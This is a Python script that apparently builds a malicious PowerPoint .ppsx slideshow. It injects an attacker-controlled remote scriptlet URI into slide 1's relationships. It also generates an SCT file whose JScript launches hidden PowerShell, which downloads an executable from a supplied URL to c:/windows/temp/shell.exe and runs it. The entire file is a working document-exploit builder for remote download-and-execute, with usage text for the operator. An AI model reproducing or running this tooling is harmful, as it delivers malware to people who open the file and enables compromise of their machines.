import getopt
import os
import shutil

import sys
import tempfile
from zipfile import *

opts, args = getopt.getopt(sys.argv[1:], "o:p:x:", ["output_filename=", "payload_uri", "xml_uri"])

if len(args) == 0:
    print "Usage: %s input_filename -o output_filename -p payload_uri -x xml_uri\n" % os.path.basename(__file__)
    print "\tinput_filename\t\tThe input ppsx file name.\n"
    print "\t-o\t\tOutput .ppsx file name, (inlcude the .ppsx)."
    print "\t-p\t\tThe payload exe or sct file url. It must be in an accessible web server. (Optional)"
    print "\t-x\t\tThe full xml uri to be called by the ppsx file. It must be in an accessible web server.(Required)"
    sys.exit(1)

input_file_name = args[0]
output_file_name = "Output_" + args[0]
payload_uri = None
xml_uri = ""

for opt in opts:
    if opt[0] == '-o':
        output_file_name = opt[1]
    elif opt[0] == '-p':
        payload_uri = opt[1]
    elif opt[0] == '-x':
        xml_uri = opt[1]

if not xml_uri:
    print "Usage: %s input_filename -o output_filename -p payload_uri -x xml_uri\n" % os.path.basename(__file__)
    print "\tinput_filename\t\tThe input ppsx file name.\n"
    print "\t-o\t\tOutput .ppsx file name, (inlcude the .ppsx)."
    print "\t-p\t\tThe payload exe or sct file url. It must be in an accessible web server. (Optional)"
    print "\t-x\t\tThe full xml uri to be called by the ppsx file. It must be in an accessible web server.(Required)"
    sys.exit(1)

if payload_uri:
    xml_template = """<?xml version="1.0"?>
    <package>
    <component id='giffile'>
    <registration
      description='Dummy'
      progid='giffile'
      version='1.00'
      remotable='True'>
    </registration>
    <script language='JScript'>
    <![CDATA[
      new ActiveXObject('WScript.shell').exec('%SystemRoot%/system32/WindowsPowerShell/v1.0/powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\'PAYLOAD_URI\', \'c:/windows/temp/shell.exe\'); c:/windows/temp/shell.exe');
    ]]>
    </script>
    </component>
    </package>"""


    f = open(xml_uri[xml_uri.rfind("/")+1:], "w")
    f.write(xml_template.replace("PAYLOAD_URI", payload_uri))
    f.close()

    print "Generated " + xml_uri[xml_uri.rfind("/")+1:] + " successfully"

def generate_exploit_ppsx():
    # Preparing malicious PPSX
    shutil.copy2(input_file_name, output_file_name)

    class UpdateableZipFile(ZipFile):
        """
		Add delete (via remove_file) and update (via writestr and write methods)
		To enable update features use UpdateableZipFile with the 'with statement',
		Upon  __exit__ (if updates were applied) a new zip file will override the exiting one with the updates
		"""

        class DeleteMarker(object):
            pass

        def __init__(self, file, mode="r", compression=ZIP_STORED, allowZip64=False):
            # Init base
            super(UpdateableZipFile, self).__init__(file, mode=mode,
                                                    compression=compression,
                                                    allowZip64=allowZip64)
            # track file to override in zip
            self._replace = {}
            # Whether the with statement was called
            self._allow_updates = False

        def writestr(self, zinfo_or_arcname, bytes, compress_type=None):
            if isinstance(zinfo_or_arcname, ZipInfo):
                name = zinfo_or_arcname.filename
            else:
                name = zinfo_or_arcname
            # If the file exits, and needs to be overridden,
            # mark the entry, and create a temp-file for it
            # we allow this only if the with statement is used
            if self._allow_updates and name in self.namelist():
                temp_file = self._replace[name] = self._replace.get(name,
                                                                    tempfile.TemporaryFile())
                temp_file.write(bytes)
            # Otherwise just act normally
            else:
                super(UpdateableZipFile, self).writestr(zinfo_or_arcname,
                                                        bytes, compress_type=compress_type)

        def write(self, filename, arcname=None, compress_type=None):
            arcname = arcname or filename
            # If the file exits, and needs to be overridden,
            # mark the entry, and create a temp-file for it
            # we allow this only if the with statement is used
            if self._allow_updates and arcname in self.namelist():
                temp_file = self._replace[arcname] = self._replace.get(arcname,
                                                                       tempfile.TemporaryFile())
                with open(filename, "rb") as source:
                    shutil.copyfileobj(source, temp_file)
            # Otherwise just act normally
            else:
                super(UpdateableZipFile, self).write(filename,
                                                     arcname=arcname, compress_type=compress_type)

        def __enter__(self):
            # Allow updates
            self._allow_updates = True
            return self

        def __exit__(self, exc_type, exc_val, exc_tb):
            # call base to close zip file, organically
            try:
                super(UpdateableZipFile, self).__exit__(exc_type, exc_val, exc_tb)
                if len(self._replace) > 0:
                    self._rebuild_zip()
            finally:
                # In case rebuild zip failed,
                # be sure to still release all the temp files
                self._close_all_temp_files()
                self._allow_updates = False

        def _close_all_temp_files(self):
            for temp_file in self._replace.itervalues():
                if hasattr(temp_file, 'close'):
                    temp_file.close()

        def remove_file(self, path):
            self._replace[path] = self.DeleteMarker()

        def _rebuild_zip(self):
            tempdir = tempfile.mkdtemp()
            try:
                temp_zip_path = os.path.join(tempdir, 'new.zip')
                with ZipFile(self.filename, 'r') as zip_read:
                    # Create new zip with assigned properties
                    with ZipFile(temp_zip_path, 'w', compression=self.compression,
                                 allowZip64=self._allowZip64) as zip_write:
                        for item in zip_read.infolist():
                            # Check if the file should be replaced / or deleted
                            replacement = self._replace.get(item.filename, None)
                            # If marked for deletion, do not copy file to new zipfile
                            if isinstance(replacement, self.DeleteMarker):
                                del self._replace[item.filename]
                                continue
                            # If marked for replacement, copy temp_file, instead of old file
                            elif replacement is not None:
                                del self._replace[item.filename]
                                # Write replacement to archive,
                                # and then close it (deleting the temp file)
                                replacement.seek(0)
                                data = replacement.read()
                                replacement.close()
                            else:
                                data = zip_read.read(item.filename)
                            zip_write.writestr(item, data)
                # Override the archive with the updated one
                shutil.move(temp_zip_path, self.filename)
            finally:
                shutil.rmtree(tempdir)

    with UpdateableZipFile(output_file_name, "a") as o:
        slide_res_file = "ppt/slides/_rels/slide1.xml.rels"
        string = o.read(slide_res_file)
        if "http://192.168.56.1/calc1.sct" not in string:
            print "Copy 'Code.exe' from the template to slide 1 of the input file and save it with extension .ppsx"
            sys.exit(1)
        string = string.replace("http://192.168.56.1/calc1.sct", xml_uri)
        o.writestr(slide_res_file, string)
    print "Generated " + output_file_name + " successfully"

if xml_uri:
    generate_exploit_ppsx()